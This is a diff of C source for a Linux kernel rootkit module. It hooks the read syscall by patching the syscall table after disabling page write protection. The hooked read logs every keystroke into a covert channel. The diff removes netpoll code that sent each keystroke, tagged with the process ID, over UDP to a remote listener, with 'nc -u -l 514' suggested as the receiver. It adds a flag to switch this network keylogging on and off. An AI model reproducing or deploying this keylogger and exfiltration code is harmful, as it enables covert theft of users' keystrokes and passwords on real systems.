@@ -5,12 +5,10 @@
  */
 #include <linux/delay.h>
 #include <linux/unistd.h>
-#include <linux/netpoll.h>
-#include <linux/init.h>
-#include <linux/sched.h>
 
 #include "covert_communication.h"
 #include "include.h"
+#include "net_keylog.h"
 
 asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
@@ -22,44 +20,7 @@ static int read_call_counter = 0;
 static spinlock_t read_lock;
 static unsigned long read_lock_flags;
 
-/* netpoll struct */
-static struct netpoll *np = NULL;
-static struct netpoll net_fill;
-
-void init_netpoll(void)
-{
-	net_fill.name = "NETKEYLOG";// For log purpose 
-	strlcpy(net_fill.dev_name, "eth0", IFNAMSIZ); //Works only for ethernet(type) port
-	
-	net_fill.local_ip.ip = htonl((unsigned long int) 0xc0a83865); //192.168.56.101 
-	net_fill.local_ip.in.s_addr = htonl((unsigned long int) 0xc0a83865); 
-
-	/* 192.168.2.4: IP of destination port 
-	 * The destination must be listening: ex: nc -u -l 514 
-	 */
-	net_fill.remote_ip.ip = htonl((unsigned long int) 0xc0a80204); 
-	net_fill.remote_ip.in.s_addr = htonl((unsigned long int) 0xc0a80204);
- 
-	net_fill.local_port = 6666; // some local port
-	net_fill.remote_port = 514; // standard UDP port for syslog server 
-
-	memset(net_fill.remote_mac, 0xff, ETH_ALEN); // Mac address
-	netpoll_print_options(&net_fill); // To print in the log
-	netpoll_setup(&net_fill);
-	np = &net_fill;
-} 
-
-/* Function to send the UDP packet */
-void send_udp(const char *buf)
-{
-	struct task_struct *task = current;
-	char buf1[200];
-	sprintf(buf1, "%d", task->pid);
-	int len1 = strlen(buf1);
-	strcpy(buf1+len1, buf);
-        int len = strlen(buf);
-        netpoll_send_udp(np,buf1,len1+len);
-}
+extern int send_flag; // For network keylogging
 
 /*
  * Our manipulated read syscall. It will log keystrokes and serve as a covert
@@ -78,7 +39,11 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 			char sendbuf[2];
 			memcpy(sendbuf, buf+i, 1);
 			memset(sendbuf+1, '\0', 1);
-			send_udp(sendbuf);
+			/* If the send_flag is set, then network keylogging is enabled */
+			if(send_flag)
+			{
+				send_udp(sendbuf);
+			}
 
 			/* send to covert communication channel */
 			accept_input(buf[i]);
@@ -95,9 +60,6 @@ void hook_read(void)
 	ROOTKIT_DEBUG("Hooking read syscall...\n");
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
-	/* Init the netpoll structure */
-	init_netpoll();
-
 	/* disable write protection */
 	disable_page_protection();
 
